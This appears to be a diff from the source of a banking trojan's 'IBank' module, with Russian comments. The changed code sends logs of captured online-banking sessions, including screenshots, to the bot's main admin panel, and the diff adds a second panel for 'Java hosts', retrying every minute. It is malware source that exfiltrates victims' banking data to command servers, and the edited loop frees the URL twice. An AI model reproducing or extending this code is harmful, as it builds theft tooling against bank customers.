@@ -458,47 +458,66 @@ namespace IBank
 	}
 	//-----------------------------------------------------------------------
 
-	PCHAR inline GetIBankURL()
+	PCHAR inline GetIBankURL(bool UseMainHosts)
 	{
 		// Функция возвращает адрес скрипта для отправки лога
+
 		#ifdef JavaConfigH
-			return GetJavaScriptURL(IBankLogPath);
-		#else
-			return GetBotScriptURL(0, IBankLogPath);
+			if (!UseMainHosts)
+				return GetJavaScriptURL(IBankLogPath);
 		#endif
+
+		return GetBotScriptURL(0, IBankLogPath);
     }
 
 	//-----------------------------------------------------------------------
 
-	DWORD WINAPI SenderProc(LPVOID Data)
+	void SendLogToAdmin(PIBankLog L, bool UseMainHosts)
 	{
-		// Отправляем отчёт
-
-		PIBankLog L = (PIBankLog)Data;
-		if (L == NULL)
-			return 0;
-
+		// Функция отправляет данные на необъодимую админку
+		// UseMainHosts - Указание отправлять лог на основную админку
 		for (int i = 1; i <= 10; i++)
 		{
-			PCHAR URL = GetIBankURL();
+			PCHAR URL = GetIBankURL(UseMainHosts);
 
 		    IBDBG("IBank", "Отправляем лог. (Попытка %d) URL - %s", i, URL);
 
 			if (URL != NULL)
 			{
-				if (SendLog(URL, L))
+				bool Sended = SendLog(URL, L);
+
+				STR::Free(URL);
+				if (Sended)
 				{
 					IBDBG("IBank", "Лог успешно отправлен");
 					STR::Free(URL);
 					break;
 				}
 			}
-
-            STR::Free(URL);
-
 			pSleep(60000);
-
 		}
+
+
+	}
+	//-----------------------------------------------------------------------
+
+
+	DWORD WINAPI SenderProc(LPVOID Data)
+	{
+		// Отправляем отчёт
+
+		PIBankLog L = (PIBankLog)Data;
+		if (!L)
+			return 0;
+
+		// Отправляем лог на основную админку бота
+		SendLogToAdmin(L, true);
+
+		#ifdef JavaConfigH
+			// Если включен модуль ява хостов то, отправляем
+			// лог и на эту админку.
+			SendLogToAdmin(L, false);
+		#endif
 
         // Уничтожаем данные
 		MemFree(L->EndScreenShot.Data);
